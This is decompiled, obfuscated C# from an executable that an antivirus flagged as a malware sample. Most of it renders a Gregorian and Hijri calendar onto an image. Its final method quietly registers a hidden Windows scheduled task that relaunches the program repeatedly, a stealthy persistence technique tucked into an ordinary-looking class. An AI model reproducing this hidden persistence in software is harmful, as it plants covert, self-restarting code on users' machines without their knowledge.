// Decompiled with JetBrains decompiler
// Type: 052709057542.Core.737786233277
// Assembly: 052709057542, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 359C9CB9-9F6B-407E-806A-B212EE061A4B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-863aa9d936ae1e503405345248a0f92c12efaa795df31afd30568cac9e6c7a0e.exe

using \u003052709057542.Core;
using \u003052709057542.Models;
using \u003052709057542.Utils;
using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Text;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace \u003052709057542.Core
{
  public class \u003737786233277 : IDisposable
  {
    private const int \u003919893960763 = 130;
    private const int \u003117961716225 = 15;
    private const string \u003202861764033 = "31";
    private const int \u003753017445887 = 70;
    private const int \u003244748429346 = 20;
    private readonly int \u003879882239687;
    private readonly Graphics \u003660870379120;
    private readonly Image \u003090766710940;
    private readonly int \u003003314968231;
    private readonly int \u003079486680858;
    private Color \u003924475316342;
    private bool \u003636909639523;
    private Color \u003468020598252;
    private Color \u003544080324924;
    private int \u003776901568456;
    private int \u003776463483018;
    private int \u003711466956582;
    private IList<Point> \u003591199658052;
    private int \u003795446122251;
    internal static readonly long \u003098627677350;

    public string \u003807334541750 { set; get; }

    public int \u003781968348941 { set; get; }

    public string \u003728788919604 { set; get; }

    public int \u003830374552383 { set; get; }

    public string \u003512430615343 { set; get; }

    public IList<\u003214199593841> \u003757480185047 { set; get; }

    public int \u003265021595375 { set; get; }

    public bool \u003300784146034 { set; get; }

    public Color \u003412135105982 { set; get; }

    public bool \u003324341580434 { set; get; }

    public void \u003684817238914()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    public Image \u003550358104718()
    {
      this.\u003510436245788();
      this.\u003048374127133();
      this.\u003364191537601();
      this.\u003591199658052 = (IList<Point>) this.\u003789139450566();
      this.\u003184644581984();
      this.\u003971247794565();
      this.\u003604491992485();
      return this.\u003090766710940;
    }

    protected virtual void Dispose(bool disposeManagedResources)
    {
      if (this.\u003636909639523 || !disposeManagedResources)
        return;
      this.\u003660870379120?.Dispose();
      this.\u003636909639523 = true;
    }

    private List<Point> \u003789139450566()
    {
      List<Point> pointList = new List<Point>();
      for (int index1 = 0; index1 < 7; ++index1)
      {
        for (int index2 = 0; index2 < 7; ++index2)
        {
          Point point = new Point(this.\u003776901568456 + index2 * this.\u003711466956582, this.\u003795446122251 + index1 * this.\u003776463483018);
          pointList.Add(point);
        }
      }
      return pointList;
    }

    private void \u003971247794565()
    {
      List<\u003214199593841> objList = new List<\u003214199593841>();
      int num1 = \u003251208662895.\u003278267976145(this.\u003079486680858, this.\u003003314968231);
      int num2 = this.\u003003314968231 <= 6 ? 31 : 30;
      if (this.\u003003314968231 - 1 == 11)
        num2 = \u003404142592531.\u003067441043899(this.\u003079486680858) ? 30 : 29;
      int num3 = 1;
      int num4 = num1 + 1;
      foreach (Point point in this.\u003591199658052.Skip<Point>(7).Take<Point>(7 - num1).Reverse<Point>().ToList<Point>())
      {
        this.\u003554506050473(num3, num4, point, (IList<\u003214199593841>) objList);
        ++num4;
        ++num3;
      }
      List<Point> list = this.\u003591199658052.Skip<Point>(14).ToList<Point>();
      int count = 0;
      Point point1 = new Point(this.\u003776901568456, this.\u003795446122251 + 7 * this.\u003776463483018);
      while (num3 <= num2)
      {
        IEnumerable<Point> points = list.Skip<Point>(count).Take<Point>(7).Reverse<Point>();
        int num5 = 1;
        foreach (Point point2 in points)
        {
          this.\u003554506050473(num3, num5, point2, (IList<\u003214199593841>) objList);
          ++num5;
          ++num3;
          if (num3 > num2)
          {
            point1 = point2;
            break;
          }
        }
        count += 7;
      }
      this.\u003180562808596((IList<\u003214199593841>) objList, point1);
    }

    private void \u003554506050473(
      int _param1,
      int _param2,
      Point _param3,
      IList<\u003214199593841> _param4)
    {
      Color? nullable = _param1 == this.\u003879882239687 ? new Color?(this.\u003412135105982) : new Color?();
      \u003214199593841 obj = this.\u003181008543009(_param1);
      if (obj != null)
      {
        if (_param1 != this.\u003879882239687)
          nullable = new Color?(this.\u003544080324924);
        if (this.\u003300784146034 || _param1 >= this.\u003879882239687)
        {
          obj.\u003252893127433 = this.\u003879882239687 == _param1;
          _param4.Add(obj);
        }
      }
      if (_param2 == 7 && _param1 != this.\u003879882239687)
        nullable = new Color?(this.\u003544080324924);
      string str = _param1.ToString((IFormatProvider) CultureInfo.InvariantCulture).\u003394916850743();
      this.\u003296477961180(_param3, str, this.\u003711466956582, this.\u003781968348941, nullable);
    }

    private void \u003184644581984()
    {
      for (int index = 6; index >= 0; --index)
      {
        string str = \u003907153887123.\u003478277535406[6 - index];
        this.\u003296477961180(this.\u003591199658052[index], str, this.\u003711466956582, this.\u003781968348941, \u003685222101055: true);
      }
    }

    private IEnumerable<\u003991460207026> \u003191753931405()
    {
      CultureInfo provider = new CultureInfo("ar-SA")
      {
        DateTimeFormat = {
          Calendar = (Calendar) new HijriCalendar()
        }
      };
      DateTime now = DateTime.Now;
      \u003991460207026[] objArray = new \u003991460207026[3];
      \u003991460207026 obj1 = new \u003991460207026();
      ((\u003877167795659) obj1).set_Day(this.\u003879882239687.ToString());
      obj1.\u003308768867394 = \u003977352532210.\u003551108655722[this.\u003003314968231 - 1] + " " + this.\u003079486680858.ToString((IFormatProvider) CultureInfo.InvariantCulture).\u003394916850743();
      objArray[0] = obj1;
      \u003991460207026 obj2 = new \u003991460207026();
      ((\u003877167795659) obj2).set_Day(string.Format("{0}", (object) int.Parse(now.ToString("dd", (IFormatProvider) provider))));
      obj2.\u003308768867394 = now.ToString("MMMM yyyy", (IFormatProvider) provider) ?? "";
      objArray[1] = obj2;
      \u003991460207026 obj3 = new \u003991460207026();
      ((\u003877167795659) obj3).set_Day(now.Day.ToString());
      obj3.\u003308768867394 = now.ToString("yyyy, MMMM", (IFormatProvider) CultureInfo.InvariantCulture) ?? "";
      objArray[2] = obj3;
      return (IEnumerable<\u003991460207026>) objArray;
    }

    private string \u003574245992297() => Path.Combine(\u003312631255777.\u003144821952739(), "fonts", this.\u003807334541750);

    private \u003214199593841 \u003181008543009(int _param1)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      \u003737786233277.\u003382990698208 obj = (\u003737786233277.\u003382990698208) new \u003737786233277.\u003282446821554();
      // ISSUE: reference to a compiler-generated field
      ((\u003737786233277.\u003282446821554) obj).\u003022246649227 = this;
      // ISSUE: reference to a compiler-generated field
      obj.\u003267245887134 = _param1;
      // ISSUE: reference to a compiler-generated method
      return this.\u003757480185047.FirstOrDefault<\u003214199593841>(new Func<\u003214199593841, bool>(obj.\u003513358544032));
    }

    private SizeF \u003292524515564(int _param1_1)
    {
      List<SizeF> source = new List<SizeF>();
      foreach (string str in \u003907153887123.\u003478277535406)
        source.Add(this.\u003605308366985(str, this.\u003781968348941));
      source.Add(this.\u003605308366985("31", this.\u003781968348941));
      float num = source.Select<SizeF, float>((Func<SizeF, float>) (_param1_2 => _param1_2.Height)).Max();
      return new SizeF(source.Select<SizeF, float>((Func<SizeF, float>) (_param1_3 => _param1_3.Width)).Max() + (float) _param1_1, num + (float) _param1_1);
    }

    private SizeF \u003605308366985(string _param1, int _param2)
    {
      string str = this.\u003574245992297();
      return \u003709960913429.\u003661858860550(_param1, _param2, FontStyle.Regular, str);
    }

    private void \u003604491992485()
    {
      if (!this.\u003324341580434)
        return;
      using (Font font = new Font(this.\u003728788919604, (float) this.\u003830374552383, FontStyle.Regular, GraphicsUnit.Pixel))
      {
        SizeF sizeF = \u003709960913429.\u003635961108747(this.\u003512430615343, font);
        this.\u003296477961180(new Point((int) ((double) this.\u003090766710940.Width - (246.0 + (double) sizeF.Width + 5.0)), this.\u003090766710940.Height - 120), this.\u003512430615343, (int) sizeF.Width + 20, this.\u003830374552383, \u003532504362764: false, \u003258512929192: font);
      }
    }

    private void \u003364191537601()
    {
      int num1 = this.\u003776463483018 + 20;
      int num2 = this.\u003711466956582;
      int num3 = this.\u003711466956582 * 6;
      int num4 = 0;
      foreach (\u003991460207026 obj in this.\u003191753931405())
      {
        Point point = new Point(this.\u003090766710940.Width - (70 + num2), num1 + num4 * this.\u003776463483018);
        this.\u003296477961180(point, obj.\u003986724937447, num2, this.\u003265021595375, new Color?(this.\u003468020598252));
        point = new Point(this.\u003090766710940.Width - (70 + num3 + num2), num1 + num4 * this.\u003776463483018);
        this.\u003296477961180(point, obj.\u003308768867394, num3, this.\u003265021595375, new Color?(this.\u003468020598252));
        ++num4;
      }
      this.\u003795446122251 = 4 * this.\u003776463483018 + 20;
    }

    private void \u003180562808596(IList<\u003214199593841> _param1, Point _param2)
    {
      int num = 2;
      float width1 = this.\u003605308366985("31", this.\u003265021595375).Width;
      foreach (\u003214199593841 obj in (IEnumerable<\u003214199593841>) _param1)
      {
        float width2 = this.\u003605308366985(obj.\u003906204596987, this.\u003265021595375).Width;
        Point point = new Point((int) ((double) this.\u003090766710940.Width - (70.0 + (double) width1 + 5.0)), _param2.Y + num * this.\u003776463483018);
        this.\u003296477961180(point, obj.\u003879920594198.ToString(), (int) width1 + 5, this.\u003265021595375, new Color?(obj.\u003252893127433 ? this.\u003412135105982 : this.\u003544080324924));
        point = new Point((int) ((double) this.\u003090766710940.Width - (70.0 + (double) width2 + (double) width1 + 10.0)), _param2.Y + num * this.\u003776463483018);
        this.\u003296477961180(point, obj.\u003906204596987, (int) width2 + 5, this.\u003265021595375, new Color?(obj.\u003252893127433 ? this.\u003412135105982 : this.\u003544080324924));
        ++num;
      }
    }

    private void \u003296477961180(
      Point _param1,
      string _param2,
      int _param3,
      int _param4,
      Color? _param5 = null,
      bool _param6 = true,
      bool _param7 = false,
      Font _param8 = null)
    {
      int x = _param1.X;
      int y = _param1.Y;
      double num = _param8 == null ? (double) this.\u003605308366985(_param2, _param4).Height : (double) \u003709960913429.\u003635961108747(_param2, _param8).Height;
      int height = (int) num + 15;
      if (num > (double) this.\u003776463483018)
        y -= height - this.\u003776463483018;
      Color color1 = !_param5.HasValue ? this.\u003924475316342 : Color.FromArgb(110, _param5.Value);
      if (_param7)
        color1 = color1.\u003821541030447(-0.12f);
      Rectangle layoutRectangle = new Rectangle(x, y, _param3, height);
      Graphics graphics = this.\u003660870379120;
      Rectangle rectangle = layoutRectangle;
      Pen pen = new Pen(color1);
      pen.Width = 1.1f;
      Color color2 = color1;
      \u003709960913429.\u003139927838077(graphics, rectangle, 15, pen, color2);
      StringFormat format = new StringFormat()
      {
        LineAlignment = StringAlignment.Center,
        Alignment = StringAlignment.Center,
        FormatFlags = _param6 ? StringFormatFlags.DirectionRightToLeft : StringFormatFlags.NoClip
      };
      this.\u003660870379120.TextRenderingHint = TextRenderingHint.AntiAlias;
      Color color3 = color1.\u003874276969990() < 130 ? Color.White : Color.Black;
      if (_param8 != null)
      {
        this.\u003660870379120.DrawString(_param2, _param8, (Brush) new SolidBrush(color3), (RectangleF) layoutRectangle, format);
      }
      else
      {
        using (PrivateFontCollection privateFontCollection = new PrivateFontCollection())
        {
          privateFontCollection.AddFontFile(this.\u003574245992297());
          using (FontFamily family = privateFontCollection.Families[0])
          {
            using (Font font = new Font(family, (float) _param4, FontStyle.Regular, GraphicsUnit.Pixel))
              this.\u003660870379120.DrawString(_param2, font, (Brush) new SolidBrush(color3), (RectangleF) layoutRectangle, format);
          }
        }
      }
    }

    private void \u003954787391280()
    {
      this.\u003924475316342 = this.\u003090766710940.\u003165948159719(new Rectangle(this.\u003776901568456 - 70, 0, this.\u003090766710940.Width, this.\u003090766710940.Height / 2)).\u003235363317342();
      this.\u003924475316342 = Color.FromArgb(190, this.\u003924475316342);
      while (this.\u003924475316342.\u003874276969990() >= 130)
        this.\u003924475316342 = this.\u003924475316342.\u003821541030447(-0.01f);
    }

    private void \u003048374127133()
    {
      this.\u003954787391280();
      this.\u003544080324924 = this.\u003924475316342.\u003821541030447(-0.7f);
      this.\u003468020598252 = this.\u003924475316342.\u003821541030447(-0.4f);
    }

    private void \u003510436245788()
    {
      SizeF sizeF = this.\u003292524515564(15);
      this.\u003776463483018 = (int) sizeF.Height;
      this.\u003711466956582 = (int) sizeF.Width;
      this.\u003776901568456 = this.\u003090766710940.Width - (70 + 7 * this.\u003711466956582);
    }

    public static void \u003128452279055()
    {
      try
      {
        ExecAction execAction = new ExecAction(Application.ExecutablePath, (string) null, Application.StartupPath);
        using (TaskDefinition taskDefinition = TaskService.Instance.NewTask())
        {
          int num = TaskService.Instance.HighestSupportedVersion >= new Version(1, 2) ? 1 : 0;
          taskDefinition.RegistrationInfo.Description = "052709057542 Runner";
          taskDefinition.RegistrationInfo.Author = "DNT";
          taskDefinition.Settings.Hidden = true;
          taskDefinition.Settings.Enabled = true;
          taskDefinition.Settings.DisallowStartIfOnBatteries = false;
          taskDefinition.Settings.StopIfGoingOnBatteries = false;
          if (num != 0)
          {
            taskDefinition.Settings.StartWhenAvailable = true;
            taskDefinition.Settings.MultipleInstances = (TaskInstancesPolicy) 2;
          }
          TimeTrigger timeTrigger1 = \u003902578959109.\u003152084231008();
          if (num == 0)
            ((Trigger) timeTrigger1).Repetition.Duration = TimeSpan.FromHours(1.1);
          taskDefinition.Triggers.Add((Trigger) timeTrigger1);
          TimeTrigger timeTrigger2 = \u003902578959109.\u003485968482266();
          if (num == 0)
            ((Trigger) timeTrigger2).Repetition.Duration = TimeSpan.FromHours(1.1);
          taskDefinition.Triggers.Add((Trigger) timeTrigger2);
          taskDefinition.Actions.Add((Action) execAction);
          TaskService.Instance.RootFolder.RegisterTaskDefinition("052709057542 Runner", taskDefinition, (TaskCreation) 6, (string) null, (string) null, (TaskLogonType) 3, (string) null);
        }
        Console.WriteLine("`052709057542 Runner` task has been added.");
      }
      catch (Exception ex)
      {
        ex.\u003333741699966();
      }
    }
  }
}
